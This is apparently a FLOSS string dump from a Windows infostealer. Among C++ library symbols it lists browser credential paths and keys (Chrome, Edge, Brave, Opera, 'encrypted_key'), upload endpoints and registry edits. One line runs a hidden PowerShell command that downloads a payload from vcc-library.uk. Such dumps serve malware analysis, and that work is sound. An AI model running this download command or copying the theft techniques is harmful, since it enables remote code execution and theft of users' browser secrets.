+INFO: floss.results: .?AV?$moneypunct@G$0A@@std@@                                                       
+INFO: floss.results: .?AV?$_Mpunct@G@std@@                                                              
+INFO: floss.results: .?AV?$moneypunct@G$00@std@@                                                        
+INFO: floss.results: .?AV?$time_get@GV?$istreambuf_iterator@GU?$char_traits@G@std@@@std@@@std@@         
+INFO: floss.results: .?AV?$time_put@GV?$ostreambuf_iterator@GU?$char_traits@G@std@@@std@@@std@@         
+INFO: floss.results: .?AV?$messages@D@std@@                                                             
+INFO: floss.results: .?AV?$money_get@DV?$istreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@        
+INFO: floss.results: .?AV?$money_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@        
+INFO: floss.results: .?AV?$moneypunct@D$0A@@std@@                                                       
+INFO: floss.results: .?AV?$_Mpunct@D@std@@                                                              
+INFO: floss.results: .?AV?$moneypunct@D$00@std@@                                                        
+INFO: floss.results: .?AV?$time_get@DV?$istreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@         
+INFO: floss.results: .?AV?$time_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@         
+INFO: floss.results: .?AVtype_info@@                                                                    
+INFO: floss.results: .?AU?$implements_delegate@U?$AsyncOperationCompletedHandler@UGeoposition@Geolocation@Devices@Windows@winrt@@@Foundation@Windows@winrt@@Ushared_type@?1???$wait_for_completed@U?$IAsyncOperation@UGeoposition@Geolocation@Devices@Windows@winrt@@@Foundation@Windows@winrt@@@impl@4@YA?A_PAEBU?$IAsyncOperation@UGeoposition@Geolocation@Devices@Windows@winrt@@@234@I@Z@@impl@winrt@@
+INFO: floss.results: .?AV?$basic_stringstream@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@            
+INFO: floss.results: .?AV?$basic_filebuf@DU?$char_traits@D@std@@@std@@                                  
+INFO: floss.results: .?AV?$codecvt@DDU_Mbstatet@@@std@@                                                 
+INFO: floss.results: .?AV?$basic_ifstream@DU?$char_traits@D@std@@@std@@                                 
+INFO: floss.results: .?AV?$output_string_adapter@DV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@detail@json_abi_v3_11_3@nlohmann@@
+INFO: floss.results: .?AV_Node_if@std@@                                                                 
+INFO: floss.results: .?AVAlgorithm@CryptoPP@@                                                           
+INFO: floss.results: .?AV?$collate@D@std@@                                                              
+INFO: floss.results: .?AV?$basic_stringbuf@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@               
+INFO: floss.results: .?AV?$_Node_str@D@std@@                                                            
+INFO: floss.results: .?AVios_base@std@@                                                                 
+INFO: floss.results: .?AVBufferedTransformation@CryptoPP@@                                              
+INFO: floss.results: .?AVerror_category@std@@                                                           
+INFO: floss.results: .?AV?$ctype@D@std@@                                                                
+INFO: floss.results: .?AV_Node_end_rep@std@@                                                            
+INFO: floss.results: .?AV_System_error_category@std@@                                                   
+INFO: floss.results: .?AU?$delegate@U?$AsyncOperationCompletedHandler@UGeoposition@Geolocation@Devices@Windows@winrt@@@Foundation@Windows@winrt@@Ushared_type@?1???$wait_for_completed@U?$IAsyncOperation@UGeoposition@Geolocation@Devices@Windows@winrt@@@Foundation@Windows@winrt@@@impl@4@YA?A_PAEBU?$IAsyncOperation@UGeoposition@Geolocation@Devices@Windows@winrt@@@234@I@Z@@impl@winrt@@
+INFO: floss.results: .?AV_Node_end_group@std@@                                                          
+INFO: floss.results: .?AV?$basic_iostream@DU?$char_traits@D@std@@@std@@                                 
+INFO: floss.results: .?AV_Node_back@std@@                                                               
+INFO: floss.results: .?AUimplements_delegate_base@impl@winrt@@                                          
+INFO: floss.results: .?AVcodecvt_base@std@@                                                             
+INFO: floss.results: .?AV_Facet_base@std@@                                                              
+INFO: floss.results: .?AV_Generic_error_category@std@@                                                  
+INFO: floss.results: .?AUtype@?$abi@U?$AsyncOperationCompletedHandler@UGeoposition@Geolocation@Devices@Windows@winrt@@@Foundation@Windows@winrt@@X@impl@winrt@@
+INFO: floss.results: .?AU_Crt_new_delete@std@@                                                          
+INFO: floss.results: .?AUtype@?$abi@UIUnknown@Foundation@Windows@winrt@@X@impl@winrt@@                  
+INFO: floss.results: .?AV?$_Iosb@H@std@@                                                                
+INFO: floss.results: .?AUmarshaler@?1??make_marshaler@impl@winrt@@YAHPEAUtype@?$abi@UIUnknown@Foundation@Windows@winrt@@X@23@PEAPEAX@Z@
+INFO: floss.results: .?AV_Iostream_error_category2@std@@                                                
+INFO: floss.results: .?AV?$basic_ofstream@DU?$char_traits@D@std@@@std@@                                 
+INFO: floss.results: .?AU?$output_adapter_protocol@D@detail@json_abi_v3_11_3@nlohmann@@                 
+INFO: floss.results: .?AV?$numpunct@D@std@@                                                             
+INFO: floss.results: .?AV?$basic_streambuf@DU?$char_traits@D@std@@@std@@                                
+INFO: floss.results: .?AV_Node_base@std@@                                                               
+INFO: floss.results: .?AV?$basic_ostringstream@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@           
+INFO: floss.results: .?AVSink@CryptoPP@@                                                                
+INFO: floss.results: .?AV?$wstring_convert@V?$codecvt_utf8@_W$0BA@$0A@@std@@_WV?$allocator@_W@2@V?$allocator@D@2@@std@@
+INFO: floss.results: .?AUIAtlStringMgr@ATL@@                                                            
+INFO: floss.results: .?AVNameValuePairs@CryptoPP@@                                                      
+INFO: floss.results: .?AUctype_base@std@@                                                               
+INFO: floss.results: .?AUshared_type@?1???$wait_for_completed@U?$IAsyncOperation@UGeoposition@Geolocation@Devices@Windows@winrt@@@Foundation@Windows@winrt@@@impl@winrt@@YA?A_PAEBU?$IAsyncOperation@UGeoposition@Geolocation@Devices@Windows@winrt@@@Foundation@Windows@2@I@Z@
+INFO: floss.results: .?AV_Root_node@std@@                                                               
+INFO: floss.results: .?AV?$_Ref_count_obj2@V?$output_string_adapter@DV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@detail@json_abi_v3_11_3@nlohmann@@@std@@
+INFO: floss.results: .?AV?$basic_istringstream@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@           
+INFO: floss.results: .?AV?$basic_istream@DU?$char_traits@D@std@@@std@@                                  
+INFO: floss.results: .?AVCAccessToken@ATL@@                                                             
+INFO: floss.results: .?AV?$codecvt_utf8@_W$0BA@$0A@@std@@                                               
+INFO: floss.results: .?AVCSid@ATL@@                                                                     
+INFO: floss.results: .?AVClonable@CryptoPP@@                                                            
+INFO: floss.results: .?AV?$basic_ios@DU?$char_traits@D@std@@@std@@                                      
+INFO: floss.results: .?AV?$num_get@DV?$istreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@          
+INFO: floss.results: .?AVCAtlStringMgr@ATL@@                                                            
+INFO: floss.results: .?AVfacet@locale@std@@                                                             
+INFO: floss.results: .?AV_Node_assert@std@@                                                             
+INFO: floss.results: .?AV?$codecvt@_WDU_Mbstatet@@@std@@                                                
+INFO: floss.results: .?AUIMarshal@impl@winrt@@                                                          
+INFO: floss.results: .?AV_Ref_count_base@std@@                                                          
+INFO: floss.results: .?AV_Node_rep@std@@                                                                
+INFO: floss.results: .?AV?$basic_ostream@DU?$char_traits@D@std@@@std@@                                  
+INFO: floss.results: .?AVWaitable@CryptoPP@@                                                            
+INFO: floss.results: .?AV?$ctype@_W@std@@                                                               
+INFO: floss.results: .?AVCWin32Heap@ATL@@                                                               
+INFO: floss.results: .?AV?$Bufferless@VSink@CryptoPP@@@CryptoPP@@                                       
+INFO: floss.results: .?AV?$_Node_class@DV?$regex_traits@D@std@@@std@@                                   
+INFO: floss.results: .?AV_Node_capture@std@@                                                            
+INFO: floss.results: .?AV_Node_endif@std@@                                                              
+INFO: floss.results: .?AV?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@          
+INFO: floss.results: .?AUIAtlMemMgr@ATL@@                                                               
+INFO: floss.results: .?AU?$module_lock_updater@$00@impl@winrt@@                                         
+INFO: floss.results: .?AV?$_Ref_count_obj2@U_Dir_enum_impl@filesystem@std@@@std@@                       
+INFO: floss.results: \Local State                                                                       
+INFO: floss.results: \well_known_doma8+                                                                 
+INFO: floss.results: \BraveSoftware\B#$                                                                 
+INFO: floss.results: \Opera S{@                                                                         
+INFO: floss.results: \Opera Software\                                                                   
+INFO: floss.results: c9vb                                                                               
+INFO: floss.results: \Opera\odC                                                                         
+INFO: floss.results: \Microsoft\Edge\                                                                   
+INFO: floss.results: .zip                                                                               
+INFO: floss.results: \Default                                                                           
+INFO: floss.results: 2Xvb                                                                               
+INFO: floss.results: \Google\Chrome\A!5                                                                 
+INFO: floss.results: \Programgz<                                                                        
+INFO: floss.results:  IP Usual Error:                                                                   
+INFO: floss.results: C:\Users                                                                           
+INFO: floss.results: U;\Users_;\Users                                                                   
+INFO: floss.results: Q:\Users_:\Users                                                                   
+INFO: floss.results:  = New-Object Sy"1                                                                 
+INFO: floss.results: Ssystem.security.27                                                                
+INFO: floss.results: system.security.27                                                                 
+INFO: floss.results: \Guest PfI                                                                         
+INFO: floss.results: \profapi.dll                                                                       
+INFO: floss.results: \Opera GLz                                                                         
+INFO: floss.results: \System DT                                                                         
+INFO: floss.results:  EMPTY HTTP RESPONSE IN PING                                                       
+INFO: floss.results: type_error                                                                         
+INFO: floss.results: os_crypt                                                                           
+INFO: floss.results: cannot use operator[] with a string argument with number                           
+INFO: floss.results: encrypted_key                                                                      
+INFO: floss.results: size                                                                               
+INFO: floss.results: file                                                                               
+INFO: floss.results: offset                                                                             
+INFO: floss.results: size                                                                               
+INFO: floss.results: system(F                                                                           
+INFO: floss.results: .c_str()                                                                           
+INFO: floss.results: File does not exist:                                                               
+INFO: floss.results: SpecilSllActn9900AT|                                                               
+INFO: floss.results: powershell Compr46                                                                 
+INFO: floss.results: https://                                                                           
+INFO: floss.results: OppsLovesVokeV42|                                                                  
+INFO: floss.results: curl -o "                                                                          
+INFO: floss.results: Content-Disposit8*                                                                 
+INFO: floss.results: /api/mnr                                                                           
+INFO: floss.results:   <Target Name="                                                                   
+INFO: floss.results: NC] Slee!e                                                                         
+INFO: floss.results: DATA                                                                               
+INFO: floss.results: BabbChnnn64xaxz|                                                                   
+INFO: floss.results: ser Data                                                                           
+INFO: floss.results: POST                                                                               
+INFO: floss.results: Content-Type                                                                       
+INFO: floss.results: Batch                                                                              
+INFO: floss.results: \BraveSoftware\Brave-Browser\User Data                                             
+INFO: floss.results: /api/mnr/bobby31.php?type=pssprc&security=Daytone                                  
+INFO: floss.results: application/x-www-form-urlencoded                                                  
+INFO: floss.results: Content-Type: mu=1                                                                 
+INFO: floss.results: S_tg_temp                                                                          
+INFO: floss.results: \key_datas                                                                         
+INFO: floss.results: \connectQE                                                                         
+INFO: floss.results: Uploader                                                                           
+INFO: floss.results: Content-Type: ap!)                                                                 
+INFO: floss.results: CookieMonsterVokeOops|                                                             
+INFO: floss.results: WalterXPrxxxzCokerPro37&|-|&                                                       
+INFO: floss.results: /bobby31                                                                           
+INFO: floss.results: >bobby31?bobby31                                                                   
+INFO: floss.results: Authorization:                                                                     
+INFO: floss.results: function                                                                           
+INFO: floss.results: SpecialAutmActn100|                                                                
+INFO: floss.results: :nail_care:   0.bk                                                                 
+INFO: floss.results: TmmmCookiePRQ|                                                                     
+INFO: floss.results: start                                                                              
+INFO: floss.results: return                                                                             
+INFO: floss.results: C:\UsersH&s                                                                        
+INFO: floss.results: (((-bnot(-bnot(                                                                    
+INFO: floss.results: .txt' -OutFile $4+                                                                 
+INFO: floss.results: std::string F                                                                      
+INFO: floss.results: https://dns.goog=                                                                  
+INFO: floss.results: MndayFrOppsLX|                                                                     
+INFO: floss.results: SPOST                                                                              
+INFO: floss.results: /api/mnr/bobby31                                                                   
+INFO: floss.results: $stubId = "                                                                        
+INFO: floss.results: if exist "                                                                         
+INFO: floss.results: Tttps://                                                                           
+INFO: floss.results: cmd.exe ;ES                                                                        
+INFO: floss.results: Host                                                                               
+INFO: floss.results: Global\PFNX_SideQE                                                                 
+INFO: floss.results: start /min cmd.e)                                                                  
+INFO: floss.results: .exe; Start-Proc46                                                                 
+INFO: floss.results: pexists&                                                                           
+INFO: floss.results: yexists&                                                                           
+INFO: floss.results: exists&                                                                            
+INFO: floss.results: VCCLibrafO                                                                         
+INFO: floss.results: powershell -NoPr>#                                                                 
+INFO: floss.results: r6VO                                                                               
+INFO: floss.results: -libraryps://vcc                                                                   
+INFO: floss.results:  { iwr -Uri 'htt                                                                   
+INFO: floss.results: start /min cmd.exe /c powershell -WindowStyle Hidden -Command "& { iwr -Uri 'https://vcc-library.uk/Stb/Retev.php?bl=
+INFO: floss.results: <PreBuildEvent>                                                                    
+INFO: floss.results: </Command>                                                                         
+INFO: floss.results: Initilaz!                                                                          
+INFO: floss.results: dir /a /s /b                                                                       
+INFO: floss.results: return @{ K =                                                                      
+INFO: floss.results: reg add "HKEY_CU                                                                   
+INFO: floss.results: VooZXOOPPPS88332`9                                                                 
+INFO: floss.results: NEW ACTId                                                                          
+INFO: floss.results: cmd.exe /c "moveqg                                                                 
+INFO: floss.results: Results of hwid 2-                                                                 
+INFO: floss.results: AtummmSaxXX1522|                                                                   
+INFO: floss.results: ; Start-Process |                                                                  
+INFO: floss.results: ~rattSalPlatSecretPlace62|                                                         
+INFO: floss.results: [EXEINF] Startin6e                                                                 
+INFO: floss.results: [EXEINF] Path is not a regular file:                                               
+INFO: floss.results: [EXEINF]                                                                           
+INFO: floss.results: Content-Type                                                                       
+INFO: floss.results: application/x-www-form-urlencoded                                                  
+INFO: floss.results: Couldnt_Parse                                                                      
+INFO: floss.results: -72340172838076674                                                                 
+INFO: floss.results: -16843010                                                                          
+INFO: floss.results: [-16843010]                                                                        
+INFO: floss.results: Mozilla/5.0 (Windows NT 14_73_31; WOW64)                                           
+INFO: floss.results: dows NT 14_73_31; WOW64) 
